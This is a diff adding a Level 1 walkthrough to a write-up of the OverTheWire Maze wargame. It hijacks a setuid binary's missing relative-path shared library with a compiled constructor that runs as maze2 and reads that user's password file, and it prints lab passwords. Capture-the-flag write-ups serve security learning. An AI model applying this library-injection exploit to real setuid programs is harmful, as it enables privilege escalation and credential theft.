@@ -1424,6 +1424,7 @@ From this we get the password as `kfL7RRfpkY`
 
 **Password: kfL7RRfpkY**
 
+
 ## Level 1:
 CMD: 
 ```bash
@@ -1432,6 +1433,183 @@ ssh maze1@maze.labs.overthewire.org -p 2225
 Password: 
 ```bash
 kfL7RRfpkY
+```
+Solution:
+```bash
+cd /maze
+```
+
+Check the binary:
+
+```bash
+ls -l maze1
+file maze1
+ldd maze1
+```
+
+Output:
+```bash
+-r-sr-x--- 1 maze2 maze1 12252 Jun 14 17:56 maze1
+maze1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=63906bd7c3a4ba9b9937463cf9b50fce29a2edb7, for GNU/Linux 3.2.0, with debug_info, not stripped
+        linux-gate.so.1 (0xf7fc6000)
+        ./libc.so.4 => not found
+        libc.so.6 => /lib32/libc.so.6 (0xf7d7f000)
+        /lib/ld-linux.so.2 (0xf7fc9000)
+```
+
+The binary requires a shared library named `./libc.so.4`, which does not exist.
+
+Create a working directory:
+
+```bash
+mkdir -p /tmp/maze1_work
+cd /tmp/maze1_work
+
+ln -sf /maze/maze1 maze1
+
+ls -l
+```
+
+Output:
+```bash
+total 0
+lrwxrwxrwx 1 maze1 maze1 11 Jun 23 17:34 maze1 -> /maze/maze1
+```
+
+Running the binary still fails:
+```bash
+./maze1
+```
+
+Output:
+```bash
+./maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory
+```
+
+Create a test library to verify whether it is loaded:
+```bash
+cat > libc.c <<'EOF'
+#include <stdio.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void init() {
+    fprintf(stderr, "LIB LOADED: uid=%d euid=%d\n",
+            getuid(), geteuid());
+}
+EOF
+```
+
+Compile:
+```bash
+gcc -m32 -shared -fPIC libc.c -o libc.so.4
+```
+
+Run:
+```bash
+./maze1
+```
+
+Output:
+```bash
+LIB LOADED: uid=15001 euid=15002
+Hello World!
+```
+
+This confirms that:
+
+* The custom library is loaded successfully.
+* The constructor executes with effective UID `maze2`.
+
+Verify:
+```bash
+ldd ./maze1
+./maze1
+```
+
+Output:
+```bash
+        linux-gate.so.1 (0xf7fc6000)
+        ./libc.so.4 (0xf7fb9000)
+        libc.so.6 => /lib32/libc.so.6 (0xf7d7a000)
+        /lib/ld-linux.so.2 (0xf7fc9000)
+
+LIB LOADED: uid=15001 euid=15002
+Hello World!
+```
+
+Check password file permissions:
+```bash
+ls -l /etc/maze_pass
+```
+
+Output:
+```bash
+total 40
+-r-------- 1 maze0 maze0  6 Jun 14 17:55 maze0
+-r-------- 1 maze1 maze1 11 Jun 14 17:55 maze1
+-r-------- 1 maze2 maze2 11 Jun 14 17:55 maze2
+-r-------- 1 maze3 maze3 11 Jun 14 17:55 maze3
+-r-------- 1 maze4 maze4 11 Jun 14 17:55 maze4
+-r-------- 1 maze5 maze5 11 Jun 14 17:55 maze5
+-r-------- 1 maze6 maze6 11 Jun 14 17:55 maze6
+-r-------- 1 maze7 maze7 11 Jun 14 17:55 maze7
+-r-------- 1 maze8 maze8 11 Jun 14 17:55 maze8
+-r-------- 1 maze9 maze9 11 Jun 14 17:55 maze9
+```
+
+Create a library that reads `/etc/maze_pass/maze2`:
+```bash
+cat > libc.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+
+__attribute__((constructor))
+void init() {
+    FILE *f = fopen("/etc/maze_pass/maze2", "r");
+
+    if (!f) {
+        perror("fopen");
+        exit(1);
+    }
+
+    char buf[128];
+
+    if (fgets(buf, sizeof(buf), f))
+        printf("%s", buf);
+
+    fclose(f);
+    exit(0);
+}
+EOF
+```
+
+Compile:
+```bash
+gcc -m32 -shared -fPIC libc.c -o libc.so.4
+```
+
+Run:
+```bash
+./maze1
+```
+
+Output:
+
+```bash
+PBeZRPjetr
+```
+**Password: PBeZRPjetr**
+
+
+## Level 2:
+CMD: 
+```bash
+ssh maze2@maze.labs.overthewire.org -p 2225
+```
+Password: 
+```bash
+PBeZRPjetr
 ```
 Solution:
 ```bash
